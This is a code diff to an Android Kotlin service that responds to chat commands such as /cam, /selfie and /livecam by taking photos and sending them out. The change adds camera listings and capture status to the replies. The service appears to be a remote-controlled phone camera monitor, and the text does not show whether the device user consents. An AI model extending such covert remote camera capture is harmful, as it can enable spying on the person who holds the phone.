@@ -123,7 +123,7 @@ class MonitoringService : LifecycleService() {
         val cmd = raw.lowercase()
         val arg = raw.substringAfter(' ', "").trim()
         when {
-            cmd == "/ping" -> sendMsg("🏓 Pong! App is alive")
+            cmd == "/ping" -> sendMsg("🏓 Pong! App is alive\n\nCameras:\n" + CameraHelper.listCameras(this))
             cmd == "/cam" -> photo(true)
             cmd == "/selfie" -> photo(false)
             cmd == "/livecam" -> live(true, arg.toIntOrNull() ?: 30)
@@ -145,13 +145,17 @@ class MonitoringService : LifecycleService() {
         }
     }
 
-    private fun photo(back: Boolean) {
-        sendMsg("📷 Taking ${if (back) "back" else "front"} photo...")
-        CameraHelper.takePhoto(this, back) { f ->
-            if (f != null) sendPhoto(f)
-            else sendMsg("🔴 Camera failed")
+   private fun photo(back: Boolean) {
+    sendMsg("📷 Taking ${if (back) "back" else "front"} photo...")
+    CameraHelper.takePhoto(this, back) { f, info ->
+        if (f != null) {
+            sendMsg("📸 Camera: $info")
+            sendPhoto(f)
+        } else {
+            sendMsg("🔴 Failed: $info")
         }
     }
+   } 
 
     private fun live(back: Boolean, seconds: Int) {
         liveJob?.cancel()
